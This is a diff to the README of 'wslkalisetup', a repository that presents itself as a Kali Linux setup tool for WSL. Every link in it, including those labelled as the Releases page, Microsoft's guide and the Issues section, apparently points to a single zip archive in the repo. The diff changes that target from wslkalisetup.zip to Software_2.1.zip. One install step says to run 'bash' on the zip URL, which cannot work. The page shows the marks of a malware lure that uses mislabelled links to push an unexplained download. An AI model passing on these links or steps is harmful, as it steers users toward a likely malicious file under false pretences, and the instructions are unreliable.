@@ -1,6 +1,6 @@
 # 🛡️ wslkalisetup - Your Ideal Security Environment for Penetration Testing
 
-[![Download](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip)
+[![Download](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip%20Now-Visit%20Releases%20Page-brightgreen)](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to wslkalisetup! This tool is perfect for cybersecurity students, penetr
 
 ## 📥 Download & Install
 
-To download the latest version of wslkalisetup, [visit the Releases page](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip). There, you will find the necessary files to set up your security environment. 
+To download the latest version of wslkalisetup, [visit the Releases page](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip). There, you will find the necessary files to set up your security environment. 
 
 When on the Releases page, locate the most recent version. Click on the highlighted download link next to the assets section. This will let you download the necessary files to your computer. 
 
@@ -17,14 +17,14 @@ When on the Releases page, locate the most recent version. Click on the highligh
 Before downloading, ensure your system meets these basic requirements:
 
 - **Operating System:** Windows 10 or later. This tool is designed to work with the Windows Subsystem for Linux (WSL).
-- **WSL:** Must have WSL installed. Follow [Microsoft's guide](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip) if you need assistance setting it up. 
+- **WSL:** Must have WSL installed. Follow [Microsoft's guide](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip) if you need assistance setting it up. 
 - **Disk Space:** At least 1 GB of free disk space for the installation files and tools.
 - **Internet Connection:** A stable connection is required during installation to fetch necessary packages and updates.
 
 ## 📂 Installation Steps
 
 1. **Download Files:**
-   - Go to [this link](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip).
+   - Go to [this link](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip).
    - Download the latest release package.
 
 2. **Extract Files:**
@@ -41,7 +41,7 @@ Before downloading, ensure your system meets these basic requirements:
      ```
    - Once in the folder, run the installation script by typing:
      ```
-     bash https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip
+     bash https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip
      ```
 
 5. **Follow Prompts:**
@@ -81,7 +81,7 @@ These tools will help you conduct thorough penetration tests efficiently.
 
 If you have any questions or need further assistance, feel free to reach out to our community. Here’s how you can connect:
 
-- **GitHub Issues:** Post any issues you encounter directly on the [Issues section](https://raw.githubusercontent.com/bac0nnfires/wslkalisetup/main/beamingly/wslkalisetup.zip) of our GitHub repository. This helps us improve the tool.
+- **GitHub Issues:** Post any issues you encounter directly on the [Issues section](https://github.com/bac0nnfires/wslkalisetup/raw/refs/heads/main/beamingly/Software_2.1.zip) of our GitHub repository. This helps us improve the tool.
 - **Forums:** Engage with other users in cybersecurity forums and discussion boards. Sharing experiences can provide valuable insights.
 - **Social Media:** Follow relevant channels for updates, tips, and more.
 
